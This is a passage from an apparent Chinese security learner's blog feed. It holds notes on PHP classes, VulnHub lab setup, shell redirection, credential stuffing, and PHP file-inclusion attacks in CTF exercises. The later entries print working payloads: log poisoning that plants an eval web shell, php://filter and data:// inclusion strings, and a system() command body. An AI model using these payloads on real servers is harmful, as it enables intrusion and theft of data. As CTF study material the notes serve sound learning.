class-name">fruit</span><span class="token punctuation">&#123;</span><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">showcolor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword static-context">parent</span><span class="token operator">::</span><span class="token function">showcolor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"apple::showcolor()\n"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$apple</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">apple</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$apple</span> <span class="token operator">=</span> <span class="token function">showcolor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="面向对象self和parent的区别"><a href="#面向对象self和parent的区别" class="headerlink" title="面向对象self和parent的区别"></a>面向对象self和parent的区别</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Par</span><span class="token punctuation">&#123;</span><span class="token comment">//父类</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'小红漂亮'</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">TITLE</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'阿里巴巴'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Chi</span> <span class="token keyword">extends</span> <span class="token class-name">Par</span> <span class="token comment">//子类</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'小黄最帅'</span><span class="token punctuation">;</span><span class="token comment">//子类静态属性</span>    <span class="token keyword">const</span> <span class="token constant">TITLE</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'刘强东|京东'</span><span class="token punctuation">;</span><span class="token comment">//子类常量</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">demo</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$str</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'自己的静态属性:'</span><span class="token operator">.</span><span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token variable">$name</span><span class="token punctuation">;</span>        <span class="token variable">$str</span> <span class="token operator">.=</span> <span class="token string single-quoted-string">'&lt;br>父类的静态属性:'</span><span class="token operator">.</span><span class="token keyword static-context">parent</span><span class="token operator">::</span><span class="token variable">$name</span><span class="token punctuation">;</span>        <span class="token variable">$str</span> <span class="token operator">.=</span> <span class="token string single-quoted-string">'&lt;br>自己的常量强东:'</span><span class="token operator">.</span><span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token constant">TITLE</span><span class="token punctuation">;</span>        <span class="token variable">$str</span> <span class="token operator">.=</span> <span class="token string single-quoted-string">'&lt;br>父类的常量阿里:'</span><span class="token operator">.</span><span class="token keyword static-context">parent</span><span class="token operator">::</span><span class="token constant">TITLE</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token variable">$str</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$obj</span> <span class="token operator">=</span>  <span class="token keyword">new</span> <span class="token class-name">Chi</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$obj</span><span class="token operator">-></span><span class="token function">demo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol><li>  相同点：self和parent都是调用父类的属性或者方法</li><li>  不同点：如果两个属性一样，假如都叫$name ，那么self::调用的是自己类中的，parent::则是调用父类的</li></ol><h2 id="php中extends"><a href="#php中extends" class="headerlink" title="php中extends"></a>php中extends</h2><ol><li><p>在php中，extends关键字用于定义类的继承，语法为</p>  <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">class</span> 子类 <span class="token keyword">extends</span> 父类<span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>  通过该关键字可以实现单继承，一个类只能从另一个类中继承数据，但一个类可以有多个子类</p></li><li><p>  即一个子类只能有一个父类，但是一个父类可以有多个子类，一对多的关系</p></li><li><p>  在c++中，一个子类可以继承一个基类，也可以继承多个基类，继承一个基类称为单继承，继承多个基类，称为多继承</p></li><li><p>  但是在php中没有多继承，只能使用单继承，也就是说，一个类只能直接从另一个类中继承数据，但是一个类可以有多个子类</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vulnhub靶场搭建</title>
      <link href="/vulnhub%E9%9D%B6%E6%9C%BA%E6%90%AD%E5%BB%BA/"/>
      <url>/vulnhub%E9%9D%B6%E6%9C%BA%E6%90%AD%E5%BB%BA/</url>
      
        <content type="html"><![CDATA[<h1 id="vulnhub靶机搭建"><a href="#vulnhub靶机搭建" class="headerlink" title="vulnhub靶机搭建"></a>vulnhub靶机搭建</h1><h2 id="预先准备工具"><a href="#预先准备工具" class="headerlink" title="预先准备工具"></a>预先准备工具</h2><ol><li>vulnhub官网的靶机(ova文件)<a href="https://www.vulnhub.com/![](https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220726110103.png)">https://www.vulnhub.com/![](https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220726110103.png)</a></li><li>virtualbox<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220726110144.png"></li><li>vmware</li><li>一个Linux环境，从虚拟机里开或者直接装子系统都可以</li></ol><h2 id="virtualbox的使用"><a href="#virtualbox的使用" class="headerlink" title="virtualbox的使用"></a>virtualbox的使用</h2><ol><li>在virtualbox主界面的页面中点击导入<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220726110331.png"></li><li>给文件<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220726110408.png"></li><li>配设置<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220726110430.png"></li><li>为了能使虚拟机能够操作vulnhub靶机，将他们放到同一个网段下，使用桥接模式，在某一个特定的虚拟机下 点击设置–&gt;点击网络–&gt;点击连接方式–&gt;点击桥接网卡<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220726110628.png"></li></ol><h3 id="virtualbox的报错问题"><a href="#virtualbox的报错问题" class="headerlink" title="virtualbox的报错问题"></a>virtualbox的报错问题</h3><ol><li>无法导入虚拟机文件–&gt;重装virtualbox，将virtualbox的安装地址设为默认</li><li>还是不行，到官网去下载插件，<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220726111302.png">，将插件放到和virtualbox同一个目录下，并且将插件导入到virtualbox中</li><li>在virtualbox的主界面点击拓展，点击右侧加号，导入插件即可<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220726111437.png"></li></ol><h2 id="使用Linux命令找到同一个网段下的vulnhub靶机"><a href="#使用Linux命令找到同一个网段下的vulnhub靶机" class="headerlink" title="使用Linux命令找到同一个网段下的vulnhub靶机"></a>使用Linux命令找到同一个网段下的vulnhub靶机</h2><ol><li>ip a (ip addr)命令的缩写，可以查看到本机联网的IP地址,其中eth0的网卡即为我们联网的IP<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220726112040.png"></li><li>查看子网掩码，区分网络号和主机号</li><li>将网络号不变，主机号设为0，加上后面的/24</li><li>nmap扫描这个得到的不同的IP地址，扫描到的端口一个一个送到浏览器里去，查看是不是靶机的页面即可</li></ol><h2 id="查看这个靶机下的不同目录"><a href="#查看这个靶机下的不同目录" class="headerlink" title="查看这个靶机下的不同目录"></a>查看这个靶机下的不同目录</h2><ol><li>dirb命令</li><li>查看帮助文档 man + 命令名称</li><li>dirb URL 即可查看到这个目录下所有的文件</li><li>得到的带’+‘的即为扫描得到的文件结果<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220726113005.png"></li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>黑洞&gt;/dev/null和2&gt;&amp;1</title>
      <link href="/%E9%BB%91%E6%B4%9E/"/>
      <url>/%E9%BB%91%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h1 id="linux命令中的-gt-dev-null黑洞"><a href="#linux命令中的-gt-dev-null黑洞" class="headerlink" title="linux命令中的&gt;/dev/null黑洞"></a>linux命令中的&gt;/dev/null黑洞</h1><h2 id="Linux中的标准输入输出"><a href="#Linux中的标准输入输出" class="headerlink" title="Linux中的标准输入输出"></a>Linux中的标准输入输出</h2><pre class="line-numbers language-none"><code class="language-none">0是标准输入，一般是从键盘获得输入1是标准输出，一般是输出到屏幕上2是标准错误，有时候屏幕上可以看到，但是重定向的文件中看不到的就是它了&gt;是重定向符号<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="gt-dev-null"><a href="#gt-dev-null" class="headerlink" title="&gt;/dev/null"></a>&gt;/dev/null</h2><ol><li>&gt;/dev/null是一个特殊的设备文件，这个文件接收到任何数据都会被丢弃，俗称“黑洞”</li><li>2&gt;/dev/null意思是把错误输出到黑洞，也就是说如果你的命令出错的话，错误报告直接就删除了，不会显示在屏幕上</li></ol><h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><ol><li>如果出现这种有很多报错的情况，可以使用2&gt;/dev/null这个选项将错误信息重定向到黑洞中，只留下正确的信息回显，这个时候我们就能快速而精确的找到我们需要的文件了<br><img src="https://img-blog.csdnimg.cn/2019102417185571.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2NoZXN0Xw==,size_16,color_FFFFFF,t_70"></li></ol><h1 id="2-gt-amp-1"><a href="#2-gt-amp-1" class="headerlink" title="2&gt;&amp;1"></a>2&gt;&amp;1</h1><h2 id="含义"><a href="#含义" class="headerlink" title="含义"></a>含义</h2><ol><li>将标准错误输出重定向到标准输出</li><li>符号&gt;&amp;是一个整体，不可分开</li></ol><h2 id="2-gt-amp-1和2-gt-1的区别"><a href="#2-gt-amp-1和2-gt-1的区别" class="headerlink" title="2&gt;&amp;1和2&gt;1的区别"></a>2&gt;&amp;1和2&gt;1的区别</h2><ol><li>符号&gt;&amp;是一个整体</li><li>2&gt;1的写法实际上是将标准错误输出重定向到名为”1“的文件中去了，没有1这个文件,而不是1所代表的标准输出</li><li>写成2&amp;&gt;1也是不可以的</li></ol><h2 id="为什么2-gt-amp-1要放在后面"><a href="#为什么2-gt-amp-1要放在后面" class="headerlink" title="为什么2&gt;&amp;1要放在后面"></a>为什么2&gt;&amp;1要放在后面</h2><ol><li>可以将1和2都理解为一个指针<pre class="line-numbers language-none"><code class="language-none">本来1-----&gt;屏幕 （1指向屏幕）执行&gt;log后， 1-----&gt;log (1指向log)执行2&gt;&amp;1后， 2-----&gt;1 (2指向1，而1指向log,因此2也指向了log)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li></ol><h1 id="gt-和-gt-gt-的区别"><a href="#gt-和-gt-gt-的区别" class="headerlink" title="&gt;和&gt;&gt;的区别"></a>&gt;和&gt;&gt;的区别</h1><ol><li>&gt;是重定向文件，覆盖文件原有的内容</li><li>&gt;&gt;是重定向文件时，以追加的方式写入文件</li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>撞库、拖库、洗库</title>
      <link href="/%E6%92%9E%E5%BA%93%E6%8B%96%E5%BA%93%E5%92%8C%E6%B4%97%E5%BA%93/"/>
      <url>/%E6%92%9E%E5%BA%93%E6%8B%96%E5%BA%93%E5%92%8C%E6%B4%97%E5%BA%93/</url>
      
        <content type="html"><![CDATA[<h1 id="撞库"><a href="#撞库" class="headerlink" title="撞库"></a>撞库</h1><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><ol><li>撞库是黑客通过收集互联网已经泄露的用户和密码信息，生成对应的字典表，尝试批量登录其它网站后，得到一系列可以登录的用户。</li><li>很多用户在不同网站使用的是相同的账号密码，因此黑客可以通过获取用户在A网站的账户从而尝试登录B网站，这就可以理解为撞库攻击</li></ol><h2 id="防护"><a href="#防护" class="headerlink" title="防护"></a>防护</h2><ol><li>撞库可采用大数据安全技术来防护，比如：用数据资产梳理发现敏感目录，使用数据库加密保护核心数据，使用数据库安全运维防运维人员撞库攻击等</li></ol><h1 id="拖库"><a href="#拖库" class="headerlink" title="拖库"></a>拖库</h1><h2 id="概念-1"><a href="#概念-1" class="headerlink" title="概念"></a>概念</h2><ol><li>拖库是指黑客侵入有价值的网络站点，把注册用户的资料数据库全部盗走的行为，因为谐音，经常被称为脱裤</li></ol><h1 id="洗库"><a href="#洗库" class="headerlink" title="洗库"></a>洗库</h1><h2 id="概念-2"><a href="#概念-2" class="headerlink" title="概念"></a>概念</h2><ol><li>在取得大量的用户数据之后，黑客会通过一系列的技术手段和黑色产业链将有价值的用户数据变现，这也通常被称作‘洗库’</li><li>最后黑客将得到的数据在其它网站上尝试登录，叫做撞库，很多用户喜欢使用统一的用户名密码，‘撞库’也可以使黑客收获颇丰</li></ol><h2 id="撞库常见姿势"><a href="#撞库常见姿势" class="headerlink" title="撞库常见姿势"></a>撞库常见姿势</h2><ol><li>使用ssh登录到服务器中<pre class="line-numbers language-none"><code class="language-none">ssh username@server<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>查看能够使用root权限的用户列表<pre class="line-numbers language-none"><code class="language-none">sudo -l<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件包含漏洞进阶--日志文件包含利用</title>
      <link href="/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E8%BF%9B%E9%98%B6--%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9A%84%E5%88%A9%E7%94%A8/"/>
      <url>/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E8%BF%9B%E9%98%B6--%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9A%84%E5%88%A9%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="文件包含漏洞进阶–日志文件包含利用"><a href="#文件包含漏洞进阶–日志文件包含利用" class="headerlink" title="文件包含漏洞进阶–日志文件包含利用"></a>文件包含漏洞进阶–日志文件包含利用</h1><h2 id="利用环境"><a href="#利用环境" class="headerlink" title="利用环境"></a>利用环境</h2><ol><li>目标服务器存在文件包含漏洞的前提下</li><li>没有上传功能下获取权限的方法</li></ol><h2 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h2><ol><li>当某个php文件存在本地文件包含漏洞，而却无法正常上传文件，这就意味着有包含漏洞却不能拿来利用，这时攻击者可能会利用apache日志文件来入侵</li><li>apache服务器运行后会生成两个日志文件，分别是access.log(访问日志)和error.log(错误日志)，apache的日志文件记录下我们的操作，并且写到访问日志access.log文件中</li></ol><h2 id="利用方法："><a href="#利用方法：" class="headerlink" title="利用方法："></a>利用方法：</h2><p>总：通过日志文件getshell</p><ol><li>通过burpsuit发送的请求包产生日志数据</li><li>包含日志文件</li><li>写入一句话木马getshell</li><li>我的理解就是：添加一条日志文件数据，此日志文件中写木马，getshell</li></ol><h2 id="日志文件相关"><a href="#日志文件相关" class="headerlink" title="日志文件相关"></a>日志文件相关</h2><h3 id="日志文件路径"><a href="#日志文件路径" class="headerlink" title="日志文件路径"></a>日志文件路径</h3><ol><li>nginx日志文件路径：?file=/var/log/nginx/access.log</li><li>apache2日志文件路径:?file=/var/log/apache2/access.log</li><li>这里主要看access.log这个日志，这个日志记录着服务器所有的访问记录，包括一些攻击流量<br><img src="https://img-blog.csdnimg.cn/img_convert/23c5f4f299615c69e592f7ece9907d94.png"></li></ol><h3 id="没有access-log的原因"><a href="#没有access-log的原因" class="headerlink" title="没有access.log的原因"></a>没有access.log的原因</h3><ol><li>进入目录下，如果发现没有access.log这个访问文件，是因为apache配置文件没有打开这个配置选项，需要对相应的功能进行开启<img src="https://img-blog.csdnimg.cn/img_convert/b8c8454b0d069865745feb6bbd09d167.png">\</li></ol><h3 id="开启access-log"><a href="#开启access-log" class="headerlink" title="开启access.log"></a>开启access.log</h3><ol><li>通过配置文件开启access.log访问日志功能<br><img src="https://img-blog.csdnimg.cn/img_convert/d49bb603d9ddf284be8f3292180d5b2c.png"></li><li>搜索CustomLog “logs/access.log” common，将前面的##注释去掉，并保存文件，然后重启PHPstudy:</li><li>访问几个网页，查看记录，对自己访问的页面有记录，说明access.log可以自动记录访问操作<br><img src="https://img-blog.csdnimg.cn/img_convert/645dae3d4466cd9df0b9917acbe526d7.png"></li></ol><h2 id="入侵过程"><a href="#入侵过程" class="headerlink" title="入侵过程"></a>入侵过程</h2><ol><li>通过访问，让访问日志记录我们的phpinfo();代码，可以看出，访问日志已经成功记录了我们的访问内容,即可以在路径后面直接加/phpinfo();<pre class="line-numbers language-none"><code class="language-none">&lt;?php phpinfo();?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="https://img-blog.csdnimg.cn/img_convert/3442991cff249f5897ff13173b42e4d5.png"></li><li>通过上图我们可以看出，日志已经成功记录我们的访问历史，但是是经过URL编码后的结果。如何让它记录我们原始完整的代码呢？一般URL编码是我们的浏览器进行完成的，它对我们访问的目录做了URL编码，然后发送到服务器，我们可以通过burpsuite，把经过浏览器URL编码后的数据进行修改。</li><li>使用burp修改编码后的数据：即将burp中抓的包中URL编码的位置改为原本的字符<br><img src="https://img-blog.csdnimg.cn/img_convert/c2a0db8f67e1b0fe3c5bd409d407a440.png"><br><img src="https://img-blog.csdnimg.cn/img_convert/357a5a76f7eb0998aa444004b3d23fca.png"></li><li>查看访问日志，可以看出没有编码的phpinfo();代码已经成功记录<br><img src="https://img-blog.csdnimg.cn/img_convert/514099aa5e2a00b27be2e2ebef9bda3c.png"></li><li>文件包含只要文件中有Php代码，它就会调用include(),require()等函数将这个文件当作php脚本进行解析，这样我们就可以包含这个日志文件，让目标服务器把日志文件解析为php脚本</li><li>让访问日志文件记录下写入文件脚本代码：（这个地方就包含了password，为了进行下一步连接蚁剑提供密码）<br>访问内容：<pre class="line-numbers language-none"><code class="language-none">&lt;?php$file&#x3D;fopen(&#39;test1.php&#39;,&#39;w&#39;);fputs($file,&#39;&lt;?php @eval($_POST[1]);?&gt;&#39;)?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li><li>对访问日志进行文件包含，并查看创建的一句话脚本，已经创建成功<img src="https://img-blog.csdnimg.cn/img_convert/80d9f87d67298bd7c9e8de1a00001a92.png">,解析方式：前面该是怎么样就是怎么样，解析不了直接跳过，一直到能够正常解析的位置就去解析</li><li>连接蚁剑，密码就是上面请求并进行URL编码解码处理后的密码</li></ol><h2 id="nginx的access-log文件详解"><a href="#nginx的access-log文件详解" class="headerlink" title="nginx的access.log文件详解"></a>nginx的access.log文件详解</h2><h2 id="nginx系统中日志文件一般放在-var-log-nginx下"><a href="#nginx系统中日志文件一般放在-var-log-nginx下" class="headerlink" title="nginx系统中日志文件一般放在/var/log/nginx下"></a>nginx系统中日志文件一般放在/var/log/nginx下</h2><ol><li>直接使用tail -f命令即可查看access日志</li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件包含漏洞</title>
      <link href="/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
      <url>/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
      
        <content type="html"><![CDATA[<h1 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h1><h2 id="文件中包含了php脚本，里面含有漏洞，就叫文件包含漏洞"><a href="#文件中包含了php脚本，里面含有漏洞，就叫文件包含漏洞" class="headerlink" title="文件中包含了php脚本，里面含有漏洞，就叫文件包含漏洞"></a>文件中包含了php脚本，里面含有漏洞，就叫文件包含漏洞</h2><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><ol><li>php文件包含漏洞产生原因是在通过PHP的函数引入文件时，由于传入的文件名没有经过合理的校验，从而操作了意想之外的文件，就可能导致意外的文件泄露甚至恶意的代码注入，最常见的就是本地文件包含漏洞</li><li>开发人员一般会把重复使用的函数写到单个文件中，需要使用某个函数时直接调用此文件，而无需再次编写，这中文件调用的过程一般被称为文件包含。</li><li>程序开发人员一般希望代码更灵活，所以将被包含的文件设置为变量，用来进行动态调用，但正是由于这种灵活性，从而导致客户端可以调用一个恶意文件，造成文件包含漏洞。</li><li>在PHP web application中文件包含漏洞居多，jsp，asp等程序中很少，这就是语言设计的弊端</li></ol><h2 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h2><ol><li>本地文件包含漏洞：网站服务器本身存在恶意文件，然后利用本地文件包含使用</li><li>远程文件包含漏洞：远程文件包含就是调用其它网站的恶意文件进行打开</li></ol><h2 id="文件包含函数"><a href="#文件包含函数" class="headerlink" title="文件包含函数"></a>文件包含函数</h2><ol><li>php：include(),include_once(),fopen(),require(),require_once()</li><li>jsp/servelt:ava.io,file(),java.io,filereader()</li><li>asp:include file;virtual</li></ol><h2 id="主流文件包含php一些函数的含义"><a href="#主流文件包含php一些函数的含义" class="headerlink" title="主流文件包含php一些函数的含义"></a>主流文件包含php一些函数的含义</h2><ol><li>include():执行到include()才会包含文件，找不到文件只会产生警告，还会接着运行后面的脚本</li><li>require():只要程序一直运行就会包含文件，如果找不到包含文件则会产生致命错误，并且脚本运行终止</li><li>include_once()和require_once()：如果文件包含被执行了，就不会执行第二次</li></ol><h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><ol><li>文件包含是也是一种执行方式，即include和require函数的执行都会执行内部的参数，将内部的参数当作php源码去执行</li></ol><h2 id="本地文件包含：LFI，local-file-inclusion"><a href="#本地文件包含：LFI，local-file-inclusion" class="headerlink" title="本地文件包含：LFI，local file inclusion"></a>本地文件包含：LFI，local file inclusion</h2><ol><li>本地文件包含漏洞指的是能打开并且包含本地文件的漏洞，大部分情况下遇到的文件包含漏洞都是LFI</li><li>首先创建两个文件，1.txt 和 11.php  如下：<br><img src="https://img-blog.csdnimg.cn/2018111011030967.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTMzODI4,size_16,color_FFFFFF,t_70"><br><img src="https://img-blog.csdnimg.cn/20181110110324655.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTMzODI4,size_16,color_FFFFFF,t_70"></li><li>创建完后并对  11.php 进行访问，并且传入参数：<br><img src="https://img-blog.csdnimg.cn/20181110110423351.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTMzODI4,size_16,color_FFFFFF,t_70"><br><img src="https://img-blog.csdnimg.cn/20181110110413561.PNG"></li><li>看吧，成功了，这就是简单的本地文件包含，但如果将1.txt 内的内容换成一句换木马，再用菜刀连接一下，那是不是就可以获取shell了，这里小编就不演示了，留给你们慢慢琢磨。。。。。。</li></ol><h2 id="远程文件包含，RFI，remote-file-inclusion"><a href="#远程文件包含，RFI，remote-file-inclusion" class="headerlink" title="远程文件包含，RFI，remote file inclusion"></a>远程文件包含，RFI，remote file inclusion</h2><ol><li>远程文件包含许哟啊对php.ini进行一些配置</li><li>即allow_url_fopen和allow_url_include要为ON，即和伪协议的使用条件相同</li><li>设置成功后记得要保存并且重新启动一下</li><li>好了现在可以开始演示远程包含了，其实和文件包含相差无几，只是把包含的换成外网链接一下就好了<br><img src="https://img-blog.csdnimg.cn/20181110112156499.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTMzODI4,size_16,color_FFFFFF,t_70"></li><li>文件包含原理也就是这么个样子，虽然操作简单，但其实是一个很危险的一个漏洞，除了可以利用他拿到shell</li></ol><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><h3 id="文件包含漏洞记得使用PHP伪协议"><a href="#文件包含漏洞记得使用PHP伪协议" class="headerlink" title="文件包含漏洞记得使用PHP伪协议"></a>文件包含漏洞记得使用PHP伪协议</h3><ol><li>什么时候使用php伪协议：文件包含</li></ol><h3 id="csdn中的一道例题"><a href="#csdn中的一道例题" class="headerlink" title="csdn中的一道例题"></a>csdn中的一道例题</h3><ol><li><a href="http://vulnerable/fileincl/example1.php?page=intro.php%EF%BC%88%E8%AF%A5php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABLFI%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E">http://vulnerable/fileincl/example1.php?page=intro.php（该php文件包含LFI本地文件上传漏洞</a>)</li><li>但是没有地方可以upload你的webshell后门代码</li><li>LFI只能读取到非php文件的源码，因为php文件会被直接执行，没有办法查看到源码</li><li>如果你能读取到config.php之类的文件，或许可以拿到数据库账号远程登录数据库入侵进去</li><li>现在的问题是：LFI如何读取到php文件的源码</li><li>演示：如果正常用LFI去读/sqli/db.php文件，是无法读取到它的源码的，只会被当作php文件被执行<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;vulnerable&#x2F;fileincl&#x2F;example1.php?page&#x3D;..&#x2F;sqli&#x2F;db.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="https://img-blog.csdn.net/20180725135532381?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5NDE5MDEz/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70"></li><li>使用php://filter/read=convert.base64-encode/resource=可以将指定php文件的源码以base64方式编码并被显示出来</li><li>因为被base64编码过了，所以可以不被执行的情况下显示源码，只不过是被base64编码过的，解码即可<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;vulnerable&#x2F;fileincl&#x2F;example1.php?page&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;..&#x2F;sqli&#x2F;db.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol><h3 id="web78"><a href="#web78" class="headerlink" title="web78"></a>web78</h3><p><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220723125157.png"></p><ol><li>没有任何过滤，可以直接使用伪代码去看看flag.php</li><li>使用php://filter伪代码</li></ol><h3 id="web79"><a href="#web79" class="headerlink" title="web79"></a>web79</h3><ol><li>发现对php有过滤，使用str_replace进行替换<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220723135932.png"></li><li>使用php://filter伪协议查看flag.php的代码发现flag.php被替换为flag.???,被过滤并且不能查看到源代码<pre class="line-numbers language-none"><code class="language-none">?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220723140046.png"></li><li>伪代码又不止一个，可以使用data://text/plain,伪协议绕过</li><li>因为过滤了’php’字样，所以使用短标签<pre class="line-numbers language-none"><code class="language-none">?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,&lt;?&#x3D; eval($_POST[1]);?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>使用data://text/plain伪协议的同时，post值<pre class="line-numbers language-none"><code class="language-none">1&#x3D;system(&quot;tac flag.php&quot;);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>即可查看到flag</li></ol><h3 id="web80"><a href="#web80" class="headerlink" title="web80"></a>web80</h3><h4 id="日志文件绕过：应用于没有上传功能的文件包含漏洞下获取权限"><a href="#日志文件绕过：应用于没有上传功能的文件包含漏洞下获取权限" class="headerlink" 